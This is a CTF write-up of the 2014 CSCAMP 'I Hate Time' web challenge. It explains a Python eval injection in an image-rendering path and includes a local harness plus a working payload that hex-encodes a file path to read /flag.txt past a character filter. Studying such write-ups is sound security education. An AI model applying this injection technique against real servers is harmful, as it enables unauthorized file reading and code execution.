---
title: "CSCAMP CTF 2014 - I Hate Time (Web)"
tags:
  - cscamp2014
  - writeup
  - web
---

Remote code execution by injecting python code into a Python WSGI server.

## Challenge Description

#### Points
400

#### Description

```
Tick Tock
hints: flag in /flag.txt
Possibly my favourite challenge from the CTF. It's a very simple website running
on a Python WSGI Server backend. It has a code injection vulnerability in its
time feature.
```


## Solution

The landing page looks like this:

Interesting regex, might be useful later. When trying to access robots.txt or
some random page, we receive the following 404:

Interesting image of the time now. Also, let's take a look at the source:

```html
<h1>Not Found</h1>
<img src="/images/now"/>
```

Looking at the source and the output, we can see that
http://178.63.58.69:8081/images/now gives you the current time dynamically. It
also looks very very suspiciously similar to the output of
`str(datetime.datetime.now())`.

I guessed the following was happening when we pass in our URL:

```python
eval("str(datetime.datetime.%s())" % hack)
```

where hack is the /image//. Now looking back at the index page, we can guess
that the regex there are the acceptable characters for this path.

So I wrote the following script to develop my exploit:

```python

import datetime
import re
import sys

def test_hack(hack):
    good = re.compile("[0-9 a-z A-Z / \" \+ , ( ) . # \[ \] =]+")
    assert good.match(hack), "There are invalid characters in your payload"
    return eval("str(datetime.datetime.%s())" % hack)

def main():
    payload = sys.argv[1]
    print test_hack(payload)

if __name__ == "__main__":
    main()
```

Testing my exploit locally:

```shell
amon@Evanna$ python testhack.py 'now().ctime()[0]+"["+file("2f666c61672e747874".decode("hex")).read()+"]".upper'
M[cool long ass flag thing lol]
```

Attacking the remote server through the URL:

Take a closer look at the generated image:

It contains our flag :D

Flag: **eVal\_is\_eVil**
